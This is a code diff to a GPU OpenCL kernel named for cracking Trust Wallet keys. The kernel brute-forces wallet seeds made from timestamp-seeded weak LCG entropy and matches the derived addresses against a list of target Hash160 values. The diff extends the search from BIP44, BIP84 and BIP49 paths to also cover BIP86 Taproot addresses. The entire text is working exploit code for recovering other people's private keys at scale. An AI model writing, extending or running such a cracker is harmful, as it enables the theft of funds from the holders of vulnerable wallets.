@@ -4,6 +4,18 @@
 // accepts a flat array of N×20-byte Hash160 targets and checks every
 // work-item against ALL targets in a single GPU pass.
 //
+// Two entropy strategies × four derivation paths = 8 combos:
+//   combo 0: VariantAnd + m/44'  (P2PKH)
+//   combo 1: VariantMod + m/44'  (P2PKH)
+//   combo 2: VariantAnd + m/84'  (P2WPKH)
+//   combo 3: VariantMod + m/84'  (P2WPKH)
+//   combo 4: VariantAnd + m/49'  (P2SH-P2WPKH)
+//   combo 5: VariantMod + m/49'  (P2SH-P2WPKH)
+//   combo 6: VariantAnd + m/86'  (P2TR Taproot)
+//   combo 7: VariantMod + m/86'  (P2TR Taproot)
+//
+// Global work size = 8 × (end_ts - start_ts).
+//
 // Kernel signature:
 //   trust_wallet_lcg_crack_mt(
 //       __global ulong* results,        // output: word0 = ts|(combo<<32), word1 = target_idx
@@ -29,8 +41,8 @@ __kernel void trust_wallet_lcg_crack_mt(
     uint   max_results
 ) {
     uint gid       = get_global_id(0);
-    uint combo     = gid % 6u;
-    uint ts_offset = gid / 6u;
+    uint combo     = gid % 8u;
+    uint ts_offset = gid / 8u;
 
     if (ts_offset >= range) return;
 
@@ -44,12 +56,6 @@ __kernel void trust_wallet_lcg_crack_mt(
         lcg_entropy_mod(timestamp, entropy);
     }
 
-    // ---- Derivation path --------------------------------------------------
-    uint purpose;
-    if      (combo < 2u) purpose = 44u;
-    else if (combo < 4u) purpose = 84u;
-    else                 purpose = 49u;
-
     // ---- BIP39 -> BIP32 ---------------------------------------------------
     uchar seed[64];
     bip39_entropy_to_seed_complete(entropy, seed);
@@ -57,40 +63,42 @@ __kernel void trust_wallet_lcg_crack_mt(
     extended_private_key_t mk;
     new_master_from_seed(0, seed, &mk);
 
-    extended_private_key_t k_purpose;
-    hardened_private_child_from_private(&mk, &k_purpose, purpose);
+    // ---- Derivation path --------------------------------------------------
+    uint purpose;
+    if      (combo < 2u) purpose = 44u;
+    else if (combo < 4u) purpose = 84u;
+    else if (combo < 6u) purpose = 49u;
+    else                 purpose = 86u;
 
-    extended_private_key_t k_coin;
-    hardened_private_child_from_private(&k_purpose, &k_coin, 0u);
-
-    extended_private_key_t k_account;
-    hardened_private_child_from_private(&k_coin, &k_account, 0u);
-
-    extended_private_key_t k_change;
-    normal_private_child_from_private(&k_account, &k_change, 0u);
-
-    extended_private_key_t k_addr;
-    normal_private_child_from_private(&k_change, &k_addr, 0u);
+    extended_private_key_t k_purpose, k_coin, k_account, k_change, k_addr;
+    hardened_private_child_from_private(&mk,        &k_purpose, purpose);
+    hardened_private_child_from_private(&k_purpose, &k_coin,    0u);
+    hardened_private_child_from_private(&k_coin,    &k_account, 0u);
+    normal_private_child_from_private  (&k_account, &k_change,  0u);
+    normal_private_child_from_private  (&k_change,  &k_addr,    0u);
 
     // ---- Public key -> Hash160 -------------------------------------------
-    extended_public_key_t pub;
-    public_from_private(&k_addr, &pub);
-
     uchar hash160[20];
 
-    if (combo >= 4u) {
+    if (combo >= 6u) {
+        // P2TR (BIP86): tweaked x-only pubkey -> HASH160
+        taproot_identifier(&k_addr, hash160);
+    } else if (combo >= 4u) {
+        // P2SH-P2WPKH (BIP49)
+        extended_public_key_t pub;
+        public_from_private(&k_addr, &pub);
         uchar inner_h160[20];
         identifier_for_public_key(&pub, inner_h160);
-
         uchar witness_script[22] __attribute__((aligned(4)));
-        witness_script[0] = 0x00;
-        witness_script[1] = 0x14;
+        witness_script[0] = 0x00; witness_script[1] = 0x14;
         for (int i = 0; i < 20; i++) witness_script[i + 2] = inner_h160[i];
-
         uchar sha256_result[32] __attribute__((aligned(4)));
         sha256((__private uint*)witness_script, 22, (__private uint*)sha256_result);
         ripemd160(sha256_result, 32, (__private uchar*)hash160);
     } else {
+        // P2PKH (BIP44) and P2WPKH (BIP84): plain HASH160(pubkey)
+        extended_public_key_t pub;
+        public_from_private(&k_addr, &pub);
         identifier_for_public_key(&pub, hash160);
     }
 
